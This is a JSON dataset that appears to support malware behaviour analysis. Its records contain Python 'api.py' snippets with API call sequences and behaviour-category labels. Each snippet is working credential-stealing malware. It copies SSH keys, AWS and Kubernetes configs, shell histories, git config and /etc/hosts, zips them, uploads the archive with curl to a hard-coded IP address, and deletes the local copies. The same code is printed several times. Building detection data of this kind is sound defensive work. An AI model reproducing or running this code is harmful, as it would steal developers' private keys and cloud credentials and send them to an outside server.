[
  {
    "pyfile": "api.py",
    "code_snippet": "import os\nimport pwd\nimport shutil\nimport subprocess\nimport zipfile\nimport io\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    start_dir = start_dir\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    aws = '/home/' + username + '/.aws'\n    kube = '/home/' + username + '/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef writeFile1(serialId='default'):\n    username = get_username()\n    filename = '/home/'+username+'/tmp/tmp.txt'\n    filename = '/home/'+username+'/tmp/tmp.zip'\n    foldername = '/home/'+username+'/tmp'\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    if username !=\"root\":\n        bashHistory = '/home/' + username + '/.bash_history'\n        zshHistory = '/home/' + username + '/.zsh_history'\n        gitConfig = '/home/' + username + '/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/home/' + username + '/.ssh'\n        zhHistory = '/home/' + username + '/.zhHistory'\n        aws = '/home/' + username + '/.aws'\n        kube = '/home/' + username + '/.kube'\n    else:\n        bashHistory = '/root/.bash_history'\n        zshHistory = '/root/.zsh_history'\n        gitConfig = '/root/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/root/.ssh'\n        zhHistory = '/root/.zhHistory'\n        aws = '/root/.aws'\n        kube = '/root/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@/tmp/tmp.zip\" + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef run():\n    if sys.platform == \"darwin\":\n        writeFile()\n    elif sys.platform == \"linux\":\n        writeFile1()",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "pwd.getpwuid",
        "os.getuid",
        "subprocess.Popen",
        "subprocess.Popen.wait",
        "subprocess.Popen.stdout.readlines",
        "os.path.exists",
        "shutil.rmtree",
        "os.makedirs",
        "open",
        "get_hosts",
        "get_username",
        "subprocess_popen",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copytree",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "zipfile.ZipFile",
        "os.walk",
        "os.path.join",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "shutil.rmtree",
        "os.system",
        "os.remove",
        "open",
        "get_hosts",
        "get_username",
        "subprocess_popen",
        "subprocess_popen",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copytree",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "os.path.exists",
        "shutil.copyfile",
        "zipfile.ZipFile",
        "os.walk",
        "os.path.join",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "shutil.rmtree",
        "os.system",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "open('/etc/hosts', 'r')",
        "pwd.getpwuid(os.getuid())",
        "os.getuid()",
        "subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)",
        "subprocess.Popen.wait()",
        "subprocess.Popen.stdout.readlines()",
        "os.path.exists(foldername)",
        "shutil.rmtree(foldername)",
        "os.makedirs(foldername)",
        "open(filename, 'a+')",
        "get_hosts()",
        "get_username()",
        "subprocess_popen(\"bash -c ls /\")",
        "os.path.exists(bashHistory)",
        "shutil.copyfile(bashHistory, foldername + '/bashHistory')",
        "os.path.exists(zshHistory)",
        "shutil.copyfile(zshHistory, foldername + '/zsh_history')",
        "os.path.exists(gitConfig)",
        "shutil.copyfile(gitConfig, foldername + '/gitConfig')",
        "os.path.exists(hosts)",
        "shutil.copyfile(hosts, foldername + '/hosts')",
        "os.path.exists(ssh)",
        "shutil.copytree(ssh, foldername + '/ssh')",
        "os.path.exists(zhHistory)",
        "shutil.copyfile(zhHistory, foldername + '/zhHistory')",
        "os.path.exists(aws)",
        "shutil.copyfile(aws, foldername + '/aws')",
        "os.path.exists(kube)",
        "shutil.copyfile(kube, foldername + '/kube')",
        "zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)",
        "os.walk(start_dir)",
        "os.path.join(dir_path, filename)",
        "zipfile.ZipFile.write(os.path.join(dir_path, filename), f_path + filename)",
        "zipfile.ZipFile.close()",
        "shutil.rmtree(foldername)",
        "os.system(command)",
        "os.remove(zipname)",
        "open(filename, 'a+')",
        "get_hosts()",
        "get_username()",
        "subprocess_popen(\"bash -c ls /\")",
        "subprocess_popen(\"hostname\")",
        "os.path.exists(bashHistory)",
        "shutil.copyfile(bashHistory, foldername + '/bashHistory')",
        "os.path.exists(zshHistory)",
        "shutil.copyfile(zshHistory, foldername + '/zsh_history')",
        "os.path.exists(gitConfig)",
        "shutil.copyfile(gitConfig, foldername + '/gitConfig')",
        "os.path.exists(hosts)",
        "shutil.copyfile(hosts, foldername + '/hosts')",
        "os.path.exists(ssh)",
        "shutil.copytree(ssh, foldername + '/ssh')",
        "os.path.exists(zhHistory)",
        "shutil.copyfile(zhHistory, foldername + '/zhHistory')",
        "os.path.exists(aws)",
        "shutil.copyfile(aws, foldername + '/aws')",
        "os.path.exists(kube)",
        "shutil.copyfile(kube, foldername + '/kube')",
        "zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)",
        "os.walk(start_dir)",
        "os.path.join(dir_path, filename)",
        "zipfile.ZipFile.write(os.path.join(dir_path, filename), f_path + filename)",
        "zipfile.ZipFile.close()",
        "shutil.rmtree(foldername)",
        "os.system(command)",
        "os.remove(zipname)"
      ],
      "mapped_sequence": [
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "pwd.getpwuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.getuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess.Popen.wait",
          "id": "wait_process_completion",
          "description": "Waits for process to complete execution",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        },
        {
          "api_name": "subprocess.Popen.stdout.readlines",
          "id": "read_process_stdout",
          "description": "Reads all bytes from process standard output",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "get_hosts",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "get_username",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess_popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copytree",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "get_hosts",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "get_username",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess_popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "subprocess_popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copytree",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "shutil.copyfile",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import os\nimport pwd\nimport shutil\nimport subprocess\nimport zipfile\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) + '\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    aws = '/home/' + username + '/.aws'\n    kube = '/home/' + username + '/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef writeFile1(serialId='default'):\n    username = get_username()\n    filename = '/home/'+username+'/tmp/tmp.txt'\n    filename = '/home/'+username+'/tmp/tmp.zip'\n    foldername = '/home/'+username+'/tmp'\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) + '\\n')\n    if username !=\"root\":\n        bashHistory = '/home/' + username + '/.bash_history'\n        zshHistory = '/home/' + username + '/.zsh_history'\n        gitConfig = '/home/' + username + '/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/home/' + username + '/.ssh'\n        zhHistory = '/home/' + username + '/.zhHistory'\n        aws = '/home/' + username + '/.aws'\n        kube = '/home/' + username + '/.kube'\n    else:\n        bashHistory = '/root/.bash_history'\n        zshHistory = '/root/.zsh_history'\n        gitConfig = '/root/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/root/.ssh'\n        zhHistory = '/root/.zhHistory'\n        aws = '/root/.aws'\n        kube = '/root/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@/tmp/tmp.zip\" + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)"
    }
  },
  {
    "pyfile": "api.py",
    "code_snippet": "import os\nimport pwd\nimport shutil\nimport zipfile\nimport io\nimport platform\nimport subprocess\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    start_dir = start_dir\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef run():\n    writeFile()",
    "pattern_analysis": {
      "api_sequence": [
        "open",
        "pwd.getpwuid",
        "os.getuid",
        "subprocess.Popen",
        "subprocess.Popen.poll",
        "subprocess.Popen.wait",
        "subprocess.Popen.stdout.readlines",
        "bytes.decode",
        "zipfile.ZipFile",
        "os.walk",
        "os.path.join",
